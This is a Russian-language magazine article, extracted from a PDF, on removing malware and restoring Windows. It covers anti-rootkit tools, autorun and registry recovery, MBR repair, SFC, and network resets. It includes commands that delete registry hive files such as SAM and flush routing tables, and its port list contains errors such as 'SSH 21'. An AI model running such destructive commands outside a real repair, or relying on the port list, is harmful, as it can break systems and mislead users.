                                     Продолжение статьи →
MALWARE              ← НАЧАЛО СТАТЬИ





                                               КАК НЕ ЗАРАЗИТЬСЯ •
                                ЧТО ДЕЛАТЬ, ЕСЛИ ВИРУС ПРОНИК •
                        КАК ВОССТАНОВИТЬ СИСТЕМУ ПОСЛЕ ПОБЕДЫ •





  Охо та на невидимок
Ре альную проблему в борь бе с малварью представляют поиск и обез вре‐
живание руткитов, поскольку они используют особые системные фичи, нап‐
ример перехват и модифи кация сис темных функций, подмена запросов
и работа в ре жиме ядра с максимальными привилегиями, что помога ет им
обойти многие защитные механизмы.
   Руч ной поиск  тут почти безуспешен, и без специаль ных утилит нам
не обойтись. По некоторым методам работы анти руткиты близ ки к антивирус‐
ным движкам, так как могут испробовать сиг натурный и эвристический метод
детек тирова ния, но все же не являются антивирусным ПО в при вычном
понимании. Рассмот рим несколько наибо лее известных и широко исполь‐
зуемых в практике инструментов.
 • RkUnhooker — одна из самых мощных тулз для обнаруже ния рут китов
   и борьбы с другими вредоносами. Позволяет обнаруживать и снимать
   перехваты таб лицы SDT и програм много кода, показывает скры тые драй‐
   веры, про цессы и фай лы. Помимо этого, RkUnhooker позволя ет убивать
  фай лы, залоченные выполняющимся про цес сом, в том чис ле с переза‐
   писью пустыми данными (чтобы предот вра тить их повторный запуск).
  А еще можно снимать дампы процессов из памяти и анализировать их.





          Окно с результатами поис ка руткитов в RkUnhooker

 • GMER — довольно извес тная ути лита, которая, помимо основной своей
  функции, вклю чает набор инструмен тов, таких как мощ ный редактор реес‐
   тра, показывающий скрытые ветки, редактор жестко го дис ка, редактор
   автозапус ка системы. Часто вместе с GMER используют RootRepeal. Эта
   тулза анализирует все запущенные драйверы и процессы в сис теме, ищет
   аномалии и другие особен ности, при сущие зловредным прог раммам.





            Ок но с резуль татами поиска руткитов в GMER

 • UnHackMe — тоже известная тулза для обнаруже ния и эффективного уда‐
   ления новых поколе ний троянов, использующих технологию руткит. Как
   заяв ляют разработ чики, она имеет уни кальные методы детекта. Ищет
   нежелательные нас трой ки поиска в бра узере, проверя ет автозапуск
   на наличие пос торонних прог рамм.





          Ок но с резуль татами поиска руткитов в UnHackMe

 • HijackThis — неболь шая программа для обнаруже ния и удаления простей‐
  ших  типов вре доносного ПО. Сейчас рас пространяется по  лицен‐
   зии GPLv2 и принадлежит антивирусной компании Trend Micro.





           Окно с результатами поис ка руткитов в HijackThis

 • TDSSKiller — оте чественный антируткит от «Лаборатории Касперского».
   Изначально соз давался для лечения систем, зараженных вре доно сами
  семейства Rootkit.Win32.TDSS. Сей час ути лита может найти и обезвредить
   такие известные руткиты, как TDSS, SST, Pihar, ZeroAccess, Sinowal, Whistler,
   Phanta, Trup, Stoned, Rloader, Cmoser, Cidox, и рут кит‐ано малии.





                   Главное окно программы TDSSKiller





              Об наружение руткитов в TDSSKiller

 • SpyDllRemover — эффективный инструмент для обнаружения и удаления
  шпи онских программ из системы. Использует свой алго ритм сканера,
   который быстро находит скры тые процес сы Rootkit, а подозрительные
  DLL — во всех запущен ных процес сах. Выводит про цес сы раз ными цве‐
   тами в зависимости от уровня угрозы, что очень помогает идентифици‐
   ровать вре доносные DLL.





         Прос мотр подозритель ных про цессов в SpyDllRemover


  Чистим авто запуск
Одна из функций малвари — обеспечить себе повторный запуск пос ле вык‐
лючения или перезаг рузки машины. Наиболее часто используемый метод —
это про писать исполняемый файл зловреда в автозапуск. Варианты здесь
раз личны: это может быть и подмена пути в ярлыке, уже лежащем в авто‐
запуске  по  пути  %USERPROFILE%\AppData\Roaming\Microsoft\Windows\
Start Menu\Programs\Startup, и назначение авто матичес ки выполняемого
задания в Пла нировщике Windows, и создание клю чей на автозапуск в сис‐
темном реес тре:
 • [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Current
  Version\RunOnce] — программы, которые запускаются только один раз,
   когда поль зователь входит в систему;
 • [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVer
  sion\Run] — программы, которые запускаются при входе текуще го поль‐
   зователя в систему;
 • [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVer
  sion\RunOnce] — программы, которые запускаются только еди ножды
   при входе текуще го пользователя в сис тему.

Что у нас есть из тулз для это го случая? Первое — это программа Autoruns,
которая поз воляет управлять авто заг рузкой в Windows. С ее помощью можно
уви деть все программы, службы, драйверы и коман дные файлы, которые
будут запускаться вместе с системой, а при необходимос ти — отключить их.





                     Главное окно утилиты Autoruns

Скажем пару слов об интерфей се и вклад ках:
 • Everything — отоб ражает все файлы, которые будут запускаться автомати‐
   чески при загрузке Windows;
 • Logon — содержит все программы, которые будут запус кать ся автомати‐
   чески;
 • Explorer — автозапуск всех элемен тов про водника Windows;
 • Internet Explorer — все надстрой ки и дополнения, которые уста новлены
   в Internet Explorer;
 • Scheduled Tasks — про цессы, которые запус каются автоматичес ки из дис‐
   петче ра задач;
 • Services — файлы  служб, автоматичес ки запус каемые при  загрузке
  машины;
 • Drivers — все файлы, относящиеся к драйверам.


  Восстанавливаем реестр
Ре естр Windows, начиная с самых пер вых версий ОС, остается критически
важ ным ком понентом системы, по сути представляя собой базу данных
для хранения различных параметров и нас троек рабочего окру жения, уста‐
новленного ПО и самой Windows. Логич но, что нарушение работы реестра
или его поврежде ние грозит нерабо тос пособным состоянием ОС. Сам
реестр, который откры вается штатной утилитой regedit, физически представ‐
лен несколькими файлами, хранящимися по пути %SystemRoot%\System32\
config\. Это фай лы с именами SYSTEM, SOFTWARE, SECURITY, SAM, DE‐
FAULT без расширений и доступные только для сис темных процессов NT AU‐
THORITY\SYSTEM, LocalSystem. Но если реестр открывать через штатный
редак тор, то эти файлы предста нут в виде большого иерархичес кого дерева.
  Первое, что при ходит на ум, — это, конеч но же, сделать бэкапы этих фай‐
лов и при необходимос ти просто заменить битые на резервные копии.
Но из‐под загруженной ОС простым копировани ем выполнить это не удастся,
а экспорт данных с использовани ем regedit может получиться непол ноцен‐
ным. Поэтому рассмот рим инструменты, которые помогут нам в этом деле.


  Штатные инстру мен ты Windows для восстановления реестра
«Из коробки» Windows, к сожалению, не имеет отдель ного инс трумента, поз‐
воля юще го делать резервные копии реестра. Все, что может дать система, —
это функци ональность морально уста ревшей NTBackUp родом из эпо хи Win‐
dows XP / 2003 Server или в новых ОС Windows 7, 8, 10 ее реинкарнацию
в виде «программы архивирования и восстанов ления Windows», предлага‐
ющей соз дать целиком образ системы (всей сис темы — не реес тра!). Поэто‐
му рассмот рим лишь небольшой пример действий в консоли вос станов‐
ления, поз воля ющих восста новить реестр вруч ную. По сути это операции
замены битых файлов на инфицирован ной системе оригинальными файлами
реестра из заранее сделанной резервной копии.





                 Интерфейс утилиты NTBackUp

Заг рузив шись в Live CD режиме с уста новочного дис ка или с локально уста‐
новленной консоли вос становления (для XP/2003), необходимо выпол нить
следующие команды, опи санные самой Microsoft:


// Создаем резервные копии реестра системы
md tmp
copy c:\windows\system32\config\system c:\windows\tmp\system.bak
copy c:\windows\system32\config\software c:\windows\tmp\software.bak
copy c:\windows\system32\config\sam c:\windows\tmp\sam.bak
copy c:\windows\system32\config\security c:\windows\tmp\security.bak
copy c:\windows\system32\config\default c:\windows\tmp\default.bak
// Удаляем битые файлы из системной директории ОС
delete c:\windows\system32\config\system
delete c:\windows\system32\config\software
delete c:\windows\system32\config\sam
delete c:\windows\system32\config\security
delete c:\windows\system32\config\default
// Копируем работоспособные файлы реестра из теневой копии
copy c:\windows\repair\system c:\windows\system32\config\system
copy c:\windows\repair\software c:\windows\system32\config\software
copy c:\windows\repair\sam c:\windows\system32\config\sam
copy c:\windows\repair\security c:\windows\system32\config\security
copy c:\windows\repair\default c:\windows\system32\config\default

Все, перезагружаем машину и смотрим на результат!


  Прод винутые методы восстановления реестра
Как мы выяснили, у Windows нет достойного инс трумента управле ния реес‐
тром. Поэтому посмотрим, что же нам могут предложить сторонние про изво‐
дители.
 • Registry Backup представляет собой бес платную  утилиту резервного
   копирования, которая исполь зует службу Windows Volume Shadow Copy
   Service для резер вного копиро вания системного реес тра. Позволяет соз‐
   давать резервную копию и восстанавливать из нее реестр.
 • WinRescue — программа не бесплат на, но нам все же хотелось бы о ней
   рассказать. Основная ее функция — пол ное вос становление опе раци‐
   онной системы Windows в слу чае ее кру шения. Помимо этого, она поз‐
   воляет делать резер вные копии важных системных фай лов и других поль‐
   зовательских данных. Несмотря на  уста ревший интерфейс  в  сти ле
   девяностых, соф тина хорошо справляется со своими обязанностями.





            Интерфейс утилиты WinRescue for Windows 7

 • ERUNT — воз можнос ти данной прог раммы весь ма обширны. Тул за поз‐
   воляет восста навливать реестр незави симо от работы ОС. Пос ле запуска
   программы следует указать раз делы реес тра, которые нуж ны для сох‐
   ранения в backup‐файле, и подож дать, пока утилита выпол нит все необ‐
  ходимые действия. Для вос станов ления, к примеру, незагружающей ся
   Windows 7 понадобится внеш ний ава рий ный заг рузоч ный диск — тот же
   BartPE или Alkid Live CD. Но также мож но исполь зовать и среду вос станов‐
   ления. В этих случаях программа дол жна быть заранее установлена
   на жестком диске, а резервная реестра копия реестра уже создана. Бэкап
   реес тра неплохо описан в этом мануале.





                    GUI‐интерфейс ути литы ERUNT


  Бе реже ного MBR бережет
Те перь мы поговорим о MBR. Ты пом нишь, что это вообще такое? Чересчур
углубляться в теорию не станем. В двух сло вах, MBR (master boot record) —
это набор кода и данных, необ ходимых для пер воначальной загрузки опе‐
раци онной системы с жесткого диска. Поэто му MBR в русскоязычном вари‐
анте часто называют прос то  заг рузочными секторами. MBR  указывает
переход в тот раздел жестко го диска, с которого сле дует исполнять даль‐
нейший код, в нашем случае — загружать ОС.
  Почему нам это важно? Да потому, что малварь еще с эпохи MS‐DOS
девянос тых годов умела инфицировать не толь ко исполняемые файлы, но и
загрузоч ные сектора, обеспечивая таким обра зом себе запуск при старте
системы. Для защиты от подобного вида атак в BIOS даже появи лась спе‐
циальная опция Boot Virus Detection, позволяющая защитить загрузоч ный сек‐
тор жестко го диска от изме нений на уровне микрокода базовой системы вво‐
да‐вывода. Если алгоритм зловреда содержал ошибки, то MBR повреждал ся,
и заг рузка сис темы станови лась невозможной. Но сущес твовали и зловреды,
которые специально мог ли потереть загрузочные сектора.
  Дело в том, что MBR находится в «невидимой области» жес ткого диска
и не все ми стандартными средствами резервирования можно сде лать его
бэкап.


 Фик сим MBR в кон соли
В эпоху Windows XP для вос становления сис темы без переустановки час то
использовалась консоль вос становления. Ее можно было проинстал лировать
на хард и выбирать как вари ант запуска при загрузке машины или запус кать
с установоч ного диска данной ОС. Консоль выручала, когда при загрузке
появлялось сообщение NTLDR is missing или были побиты системные файлы
bootfont.bin, ntbootdd.sys, ntdetect.com и boot.ini. Независимо от причины
в кон соли под ряд прописывались команды


Fixmbr
Fixboot

Ко ман да ﬁxmbr позволяла найти и авто матически исправить ошиб ки в MBR.
Коман да ﬁxboot помечала раздел как bootable, прописы вала загрузчик nt‐
loader в boot‐сектор, копировала на раз дел необ ходимые системные файлы
и генери ровала файл boot.ini. При следующем старте система, как правило,
воз вращалась в работоспособ ное состояние.





  Вызов справ ки по коман дам вос становления MBR в консоли восстанов‐
  ления Windows


  Прод винутые средства для восстановления MBR
Универсальным вариантом защиты MBR станет создание его резервной
копии и при необходимости восста нов ление ее на боевую систему. Посколь‐
ку, как мы уже говорили, заг рузочные сектора недос тупны для редак тирова‐
ния из‐под работа ющей ОС, необходимо воспользоваться специальными
инструментами.
  Comodo Backup — бесплатная ути лита, предназначенная для того, чтобы
создавать образы хардов, их раз делов и, конечно же, MBR. Нас в данном слу‐
чае будет интересовать именно MBR.





        Окно мастера резервного копиро вания в Comodo Backup

Итак, запускаем тулзу в режиме Live CD, выбираем опцию бэкапа mbr, далее
место сох ранения, и наша резервная копия готова! Если на инфи цированной
машине будет поврежден заг рузчик, мы можем просто его восстановить,
операция занима ет всего несколько минут.
   Если ты юзаешь Linux в качестве ОС, то можешь восполь зовать ся встро‐
енны ми ути лита ми, имеется неплохой гайд по бэкапу MBR под Linux на при‐
мере Ubuntu.


  Путь от MBR до UEFI и GPT
В 2010 году на смену много лет существовавшей классической BIOS пришла
новая тех нология, получившая название UEFI, а вместе с ней и изме нения
про цесса загрузки, подталкивающие нас отка зываться от MBR и исполь‐
зовать GPT. UEFI — это, по сути, обер тка или интерфейс между ОC и мик‐
рокодом, вшитым в чипы материн ской платы. Поэто му UEFI при инициали‐
зации загрузки использует не классичес кий MBR, а GPT. В теорию вопроса
мы опять же не полезем, для тех, кто хочет поболь ше узнать, есть материал
«Срав нение структур разделов GPT и MBR».
  Поскольку струк тура GPT отличает ся от структуры клас сического MBR,
сохранить его описанным выше спо собом не удас тся. Выходом станет соз‐
дание цельного обра за системы, нап ример штатной утилитой «Ре зер вное
копиро вание и восстановление данных Windows», бес плат ным набором
из Paragon Backup & Recovery Free Edition или ком мерческой прог раммой
Acronis True Image. Но более подробно о том, как сде лать бэкапы сис темы,
мы поговорим чуть ниже.


СПАСЕНИЕ СИСТЕМНЫХ ФАЙЛОВ

Не редко малварь из‐за содержащихся в ней ошибок или сопротивляясь
лечению  поврежда ет  некоторые  системные фай лы,  что  при водит ОС
в неработос пособное состояние. Пере уста новка ОС в данном случае не наш
выбор, так как это зай мет гораз до больше времени и, что немаловажно, зат‐
рет настройки ПО и прочую ценную информацию. Поэтому восстанавливать
систему нужно точеч ными дей ствиями, то есть именно в тех местах, где она
была повреждена.


                                     Продолжение статьи →
MALWARE              ← НАЧАЛО СТАТЬИ





                                               КАК НЕ ЗАРАЗИТЬСЯ •
                                ЧТО ДЕЛАТЬ, ЕСЛИ ВИРУС ПРОНИК •
                        КАК ВОССТАНОВИТЬ СИСТЕМУ ПОСЛЕ ПОБЕДЫ •





  Про верка и восстановление системных файлов Windows
Штатная ути лита SFC.EXE (System Files Checker) существует во всех версиях
Windows, начиная еще с Windows 2000, и предназначена она для проверки
состояния и восстановления системных файлов. Механизмы защиты важных
системных файлов (обычно исполня емых  *.exe, файлов биб лиотек  *.dll
и *.sys‐файлов драйверов) проверяют целостность указанных фай лов и, если
те поврежде ны или отсутству ют, вос станавлива ют их до сос тояния по умол‐
чанию.
  На практике проверить целостность сис темных файлов Windows можно
с помощью команды кон соли


sfc /scannow

Но у sfc /scannow может не получить ся испра вить ошибки в системных фай‐
лах. В этом случае, как вариант, ты можешь ввес ти в командной строке


findstr /c:"[SR]" %windir%\Logs\CBS\CBS.log >"%userprofile%\Desktop\
sfc.txt"

Эта коман да создаст текстовый файл sfc.txt на тво ем рабочем столе
со списком фай лов, испра вить которые не уда лось. Ты можешь его прос‐
мотреть и при необходимос ти вручную ско пировать нужные файлы с другого
компьюте ра с той же версией Windows или с оригиналь ного дистрибутива
ОС.





     Окно кон соли Windows с результатами выполнения команды sfc

Наибо лее кри тич ные системные файлы:
 • Ntoskrnl.exe — файл ядра опе рационных систем семейства Windows NT;
 • Hal.dll, или слой аппаратных абстрак ций, реализованный в системном ПО,
   находит ся между физическим уровнем аппа ратного обес печения и прог‐
  раммным обеспечени ем, запускаемым на этом компьютере;
 • kernel32.dll — динамически подключаемая биб лиотека, ядро всех вер сий
  ОС Microsoft Windows. Содержит базовые APIWin32, такие как управление
   памятью, опе рации ввода‐вывода, соз дание про цес сов и потоков и фун‐
   кции синхрониза ции;
 • NTLDR, а чуть позднее IA64ldr и Winload — загрузчик операци онных сис‐
   тем Windows NT;
 • ntdetect.com — ком понент операционных сис тем Microsoft семейства Win‐
   dows NT, который использует ся в процес се запус ка Windows NT до вер‐
   сии 6.0.

  Накатим драйверы по‑быстро му
Мал варь может инсталлировать в систему свои драйверы,  к при меру
для перехвата данных, введенных с клавиатуры, или для скрытия сле дов сво‐
его присутствия в инфицированной сис теме. Таким обра зом, она может уда‐
лить ори гинальный драйвер или некорректно попытается его пропатчить.
Поэтому сей час речь пойдет о том, как по‐быс трому вос становить оригиналь‐
ное сос тояние работа ющих в системе драйверов. Лучшим вари антом будет
создать эталонный набор драйверов, инсталлированных в работающей сис‐
теме, и при необходимости не ковырять каждый по отдельнос ти, а восста‐
новить их все разом. Для это го вос пользуемся нес колькими тул зами.
 • SlimDrivers — это одна из луч ших прог рамм для работы с драй верами.
  Соф тинка поз воляет искать и обновлять любые драйверы, восстанав‐
   ливать их из резервных копий.





                    Окно утилиты SlimDrivers

 • Double Driver — доволь но маленькая бесплатная ути лита для создания
   резервных копий драйверов. Все, что нам нужно сде лать, — это архив
   с драйверами с ори гинальной системы, сохранить архив в надеж ном мес‐
   те и, открыв в той же программе, вос становить их обратно в сис тему. Все!





                   Окно утилиты Double Driver


 Фик сим про вод ник и дру гие ошиб ки системы
Даже после вос становления работос пособ ности системы и удаления мал‐
вари из ОС могут остаться неп риятные следы — последс твия инфи циро‐
вания. К примеру, может пропасть ассо циация фай лов с нужной программой,
будет заблокиро ван штатный диспетчер задач Windows, недос тупен редактор
реестра (regedit), невозможно будет открыть панель управления. Что же
с этим делать? Практически все изменения обратимы. Конеч но, можно
самос тоятельно вручную копать ся в реес тре, искать нуж ные клю чи кон‐
фигурирова ния и вос станавливать их, прописывая значения по умол чанию,
но мы обратимся за помощью к специальным тулзам, заточенным под это
дело. Итак, встречай!
 • Fix for Windows — сбор ник универсальных фиксов и патчей для опе раци‐
   онных систем Microsoft Windows. Утилита под одним капотом объединяет
   несколь ко блоков проблем, которые могут воз никнуть, например фиксы
   разложены по категориям Boot, Speed, Desktop, LAN, Other и так далее.
   Перехо дя от одной катего рии к другой, можно ста вить чеки напротив тех
   параметров, которые ты хочешь привести в порядок, например исправ‐
   ление проблемы с кодиров кой и шрифтами, вос становление языковой
   панели, включение/отклю чение UAC, включение отображения скры тых
  фай лов.
 • Microsoft Easy Fix — бес плат ная нативная утилита для устранения непола‐
   док Windows, препятс тву ющих нор мальной работе опе раци онной сис‐
   темы. Данный инструмент поможет выявить и решить самые рас простра‐
   ненные проблемы с прог раммным обеспечени ем Microsoft и сторонних
   разработчиков, влияющие на штат ную работу системы.





                  Окно ути литы Microsoft Easy Fix

 • FixWin 10 — бесплатная программа, которая позволяет автоматически
   исправить многие надоедли вые ошибки, а также решить другие проб лемы
   с Windows, типичные не только для «десят ки». Тул за позволяет решать сле‐
  дующие проблемы с помощью подпрог рамм с говоря щими названиями:

    • File Explorer — борет ся с ошибками проводника (не запускается
     рабочий стол при вхо де в Windows, ошиб ки WerMgr и  WerFault,
     не работа ет CD‐ и DVD‐привод и дру гие);
    • Internet and Connectivity — сетевые проб лемы (сброс DNS и про‐
      токо ла TCP/IP, сброс фай рвола, сброс Winsock и подобное);
    • System Tools — ошибки при запус ке сис темных инстру ментов Win‐
     dows, например диспетчер задач, коман дная стро ка или редактор
     реестра были отклю чены администратором системы, отключены точки
     вос становления, настрой ки безопас ности сброшены на нас тройки
     по умолчанию.





                     Окно утилиты FixWin 10

 • Windows Repair Portable Free — бес плат ный и легко переносимый инстру‐
   мент для устранения различных неисправностей сис темы. Тулза поз воляет
   восста навливать параметры Windows к их значениям по умолчанию, что
   во многих случаях помогает исправить большинс тво неполадок, к примеру
   такие ошибки, как неверные пра ва дос тупа к фай лам, проблемы с Windows
   Update, штатным файрволом, и многое другое.




                    Не быва ет абсолютно защищенных систем. Нес‐
                      мотря на все предпринятые меры безопасности,
                         всег да есть риск, что угро за будет реализова на.
                    Малварь может использовать  0day‐уязвимость
                      или недоку ментирован ные возможнос ти ОС, пре‐
                       вен тивно защитить ся от которых не выйдет. Луч‐
                  шим вари антом стра ховки будет регулярное соз‐
                      дание резер вных копий данных.



ЗАПУСКАЕМ СЕТЬ ПО-НОВОМУ

Ис ходя из заложен ных в нее алгоритмов, малварь может манипулировать
сетевы ми нас тройками системы, изменяя мар шру тизацию трафика, под‐
делывать разрешение DNS‐имен и тому подоб ное. Соот ветс твенно, в этих
условиях нескорые хос ты, веб‐сай ты и облачные сер висы могут стать недос‐
тупны или работать некор ректно. Также код малвари может содер жать ошиб‐
ки, некорректно отрабаты вать, что в конеч ном сче те способно полностью
положить нашу сеть.


  Восстанавливаем hosts
Больше все го на све те малварь любит манипу лировать с фай лом hosts,
который находится в системной директории по пути %SystemRoot%\sys‐
tem32\drivers\etc\hosts. По сути, это обыч ный тек стовый файл, содер‐
жащий локаль ную базу данных доменных имен и используемый при их тран‐
сля ции  в  сетевые адреса. При  раз решении имени  удаленного  хоста
или веб‐сай та зап рос к этому файлу имеет приори тет перед обращением
к DNS‐серверам, прописанным в настройках сетевой карты. Малварь редак‐
тирует этот файл таким обра зом, чтобы все сайты разработчиков антивирус‐
ного ПО оказались недоступны ми вместе с репозиториями, содержащими
обновлен ные анти вирусные сигнатуры.
  Другой кейс — это использование данного фай ла с целью фишинга, то
есть перенаправле ния с IP‐адресов легальных ресурсов, таких как соци аль‐
ные сети, онлайн‐банк, на их поддель ные аналоги. Но и решение данной
проблемы тоже довольно простое. Достаточно будет заменить изме ненный
hosts на ори гинальный файл, к примеру взятый из резервной копии, или даже
вовсе заменить его пустым файлом, не содержащим записей, но имеющим
указанное имя и располага ющимся по ука занному пути. Кста ти, нелишне
было бы проверить, где hosts должен лежать в данном экземпляре сис темы,
пос коль ку любое значение по умолчанию можно изменить. Точ ный путь рас‐
положения фай ла можно узнать в клю че реес тра по пути HKEY_LOCAL_MA‐
CHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Data‐
BasePath.


  Восстанавливаем работу сетевых служб
Второе, на что сто ит обратить вни мание при восста новлении работоспособ‐
ности сети, — это состояние запущен ных сетевых служб Windows. Есть слу‐
чаи, когда зловред намеренно оста навливает сетевую службу или ста вит ее
на паузу для собственных манипуляций, а пос ле не успевает перезапус тить
или делает это с ошибкой. В результате у нас блокируется обмен сетевым
трафиком. Вари антов тут несколь ко. Можно зайти через «Панель управле ния
→ Администрирование → Службы» или по‐быс трому запус тить ту же самую
консоль через Win + R, написав services.msc. Мы видим список всех служб
Windows, нас в данном случае интересу ют толь ко несколько се тевых:
 • DHCP‐кли ент;
 • DNS‐клиент;
 • веб‐клиент;
 • ав тонас тройка WWAN;
 • агент политики IPsec (если у тебя про кину ты VPN‐сес сии);
 • брандмауэр Windows (если использует ся штат ный файрвол);
 • локатор удаленного вызова процедур (RPC);
 • маршрутиза ция и уда лен ный доступ (ты знаешь об этом, если тебе
   это реально нужно).

Эти службы должны находиться в состоянии «Запуще ны/Работают». Если
это не так, то можно щелкнуть по каждому указан ному эле менту, провалиться
в  отдель ное  окно,  где, нажав  на  соот ветс твующую  кнопку,  запус тить
или переза пус тить сер вис.
   Ну и настоящий профессиональный вариант — это работа в консоли.
Открываем CMD, пишем в нем net start или net start | more и видим,
какие служ бы сейчас запущены.
   Чтобы запустить служ бу, тут же из консоли дос таточно наб рать net start
<имя  службы>. Помнить названия всех служб необязательно, достаточно
будет посмотреть под робное инфо с помощью команды sc query type=
service state= all или глянуть го товый список тут.
  Из консоли любую службу можно запус тить по команде net start <имя
службы>, например стартануть DNS мож но так:


net start DNS

Итак, службы мы налади ли, но сеть по‐преж нему недоступна или работает
с перебоями? Идем дальше!


  Правим маршру тизацию и про веряем порты
Мал варь может прописы вать динамические маршру ты в локаль ную таблицу
маршрутизации Windows и менять таким обра зом обмен сетевым трафиком
с другими хос тами. Нап ример, если наша машина получа ет все сетевые нас‐
тройки по DHCP‐про токолу, в случае его некор ректной работы мы останемся
без интернета. Придется снова лезть в кон соль!
   Чтобы  удалить новые маршруты и вер нуть  таб лицу маршрутизации
к исходному виду, набираем соответс твен но


route print
route delete *

Иногда это го может ока заться мало и при ходит ся сбрасывать нас трой ки
к зна чениям по умол чанию. Вводим коман ды


netsh interface reset all
netsh winsock reset
netsh firewall reset
netsh winhttp reset proxy

Эти команды перезаписывают клю чи в реестре на зна чения по умол чанию
(как после пере установ ки вин ды):


SYSTEM\CurrentControlSet\Services\Tcpip\Parameters
SYSTEM\CurrentControlSet\Services\DHCP\Parameters

В случае если сетевые нас тройки машина получа ет по DHCP, пригодятся сле‐
дующие команды. Если, например, DNS‐сервер не отвечает или не уда ется
най ти DNS‐адрес сер вера, то можно выпол нить только сброс DNS такой
коман дой:


ipconfig /flushdns

Ес ли не помогает, мож но пой ти на более радикальные меры, выпол нив


ipconfig /release
// подождать несколько секунд или минут
ipconfig /renew

Эти команды пол ностью обно вят кон фиг сети, выданный твоей машине
локальным DHCP‐сервером.
   Те перь нуж но сказать о портах, то есть тех интерфейсах, через которые,
по сути, и идет обмен пакета ми. Может стать ся, что мал варь залочила
какой‐то важный системный порт или прос лушивает один из свобод ных
на пред мет команд, приходя щих из внеш ней сети. Список наибо лее важных
системных портов доволь но корот кий, его можно прос то запомнить:
 • SSH 21;
 • DNS и DHCP 53,67, 68;
 • email 25;
 • web 80, 81;
 • RPC 135, 443, 445.

Пол ный же спи сок сетевых портов можно глянуть в любом справоч нике.
В боль шинстве операционных систем сос тояние сетевых служб можно пос‐
мотреть при помощи команды


netstat ‐an

Клю чи команды netstat:
 • a — отображать все соединения и используемые пор ты;
 • o — отоб ражать  числовой иден тифика тор процесса,  отве чающего
   за кон крет ное соединение (Process ID, или поп росту PID);
 • n — указывает ути лите netstat отоб ражать реальные IP‐адре са и циф‐
   ровые значения портов вмес то их DNS‐имен.

В выводе можно уви деть сос тояние, в котором находит ся соеди нение:
 • Established — соединение уста нов лено (то есть кто‐то к тебе подключил ся
   или ты к кому‐то подключился);
 • Listening — компьютер ожидает подключения по этому порту, то есть
   какая‐то программа (про цесс в памяти) слушает обращение на этот порт;
 • Time_wait — программа, которая прослушивает порт, ожидает прихода
   пакета, что бы перевести порт в одно из сос тояний, либо на порт дол го
   не было обращений и по тайм‐ауту программа готовится его закрыть.

В выводе мы видим большой лис тинг, содер жащий IP‐адреса и состояние
пор та. К сожале нию, ассоциации с про цес сом в памяти здесь нет, поэтому
при ходится про яснять это вручную. Через знак : мы видим, какой процесс
при вязан к это му IP‐адресу (то есть открыт порт, установлено соединение).
Теперь нужно найти этот PID в листинге процессов командой tasklist |
find "3104" и в выводе опре делить, какое приложе ние использует этот
сетевой поток. Либо можно чуть упростить задачу — если тебе пре тит tasklist,
можно вос пользоваться системным дис петчером задач. Запусти его, нажав
Ctrl + Shift + Esc, перей ди на вкладку «Процес сы». В меню «Вид» выбери пункт
«Выб рать столбцы» и отметь столбец PID. Нуж ный процесс можно найти
по значению это го столбца.
   Если не хочешь работать в консоли, для графического вывода мож но вос‐
поль зоваться ути литами Process Explorer, TCPView, Nirsoft CurrPorts.





                     Окно утилиты TCPView





                  Окно ути литы Nirsoft CurrPorts

Спи сок сетевых служб и соот носящихся с ними резервированных портов
для NT‐шных систем можно пос мотреть в фай ле %SystemRoot%\system32\
drivers\etc\services — это тоже по сути тек стовый файл без расширения,
который доступен к прос мотру любым блокнотом.
  И напоследок для всего из опи санного выше, что мы делали руками, мож‐
но использовать тулзы, к примеру WinSock XP Fix. Данная утилита восста нав‐
ливает клю чи реестра сетевых нас тро ек системы со значениями по умол‐
чанию. Помимо этого, она также:
 • проверяет файл hosts на правильность указате ля localhost (обязан ссы‐
   латься на адрес 127.0.0.1);
 • соз дает бэкап текущих системных установок (по желанию пользовате ля);
 • от клю чает все сетевые адаптеры и переустанав ливает их параметры.





                   Окно ути литы WinSock XP Fix

Натив ная тулза с графическим интерфей сом Microsoft Easy Fix, о которой мы
говорили, выполняет то же самое, что и команды netsh int ip reset и netsh
winsock reset. Аналогична ей тулза Reset TCPIP, которая выпол няет все опи‐
санные ком бинации кон соль ных команд под одним GUI.





                    Окно ути литы Reset TCPIP

NetAdapter Repair — еще одна хорошая бес платная тулза пред назначена
для исправ ления самых разных оши бок, свя занных с работой сети и интерне‐
та в Windows. Краткий спи сок ее воз можностей:
 • очистить и исправить файл hosts;
 • вклю чить Ethernet и беспро водные адаптеры сети;
 • сбросить Winsock и про токол TCP/IP;
 • очистить кеш DNS, таб лицы мар шрутизации, очистить статические IP под‐
   клю чений;
 • перезагрузить NetBIOS.





                 Окно ути литы NetAdapter Repair


LIVE CD КАК СПАСАТЕЛЬНЫЙ КРУГ

И, про должая нашу тему, мы прос то не могли пройти мимо расска за о Live CD
сборках, предназначен ных для восста нов ления системы. Изначально Livе CD
позици онировался как инстру мент для выполнения адми нистра тивных задач:
под готов ки жестко го диска, оперативного получе ния доступа к данным, хра‐
нящимся на дисках, и так далее. Сейчас же Live CD напоми нают скорее уни‐
версальный спасательный круг для реани мации сис темы в случае раз личных
падений, в том числе и после вирус ной атаки. Главное их достоинство зак‐
люча ется в том, что все инс тру мен ты собраны под одним капотом и могут
работать параллельно. Но есть и недостаток: чтобы загрузиться в Live CD
режиме, нужно перезаг ружать машину, что в некоторых случаях для нас
недопус тимо.
  Все известные антивирусные разработчики имеют бесплатные загрузоч‐
ные диски для вос становления системы. Мы кратенько по ним пробежимся,
но углубляться в детали не ста нем — мы же догово рились в начале нашего
материала, что будем использовать только те инстру менты, которые не явля‐
ются анти вирусным ПО в чистом виде.


                                     Продолжение статьи →
MALWARE              ← НАЧАЛО СТАТЬИ





                                               КАК НЕ ЗАРАЗИТЬСЯ •
                                ЧТО ДЕЛАТЬ, ЕСЛИ ВИРУС ПРОНИК •
                        КАК ВОССТАНОВИТЬ СИСТЕМУ ПОСЛЕ ПОБЕДЫ •





  Live CD от вен доров антивирусного ПО
 • Kaspersky Rescue Disk — как ты уже понял, это аварийный Live Disk на базе
   Gentoo Linux от российского вендора «Лаборатория Касперского». Сре да
   восста новления содержит бра узер, фай ловый менеджер, редактор сис‐
   темно го реестра Windows. Помимо этого, есть воз можность обновления
   анти вирусных баз антивируса Kaspersky.





              Рабочий стол среды Kaspersky Rescue Disk

 • Dr.Web Live CD — Live CD от ком пании Dr.Web, построенный на базе Gen‐
   too Linux. В числе инструментария Dr.Web Live CD — средство диагностики
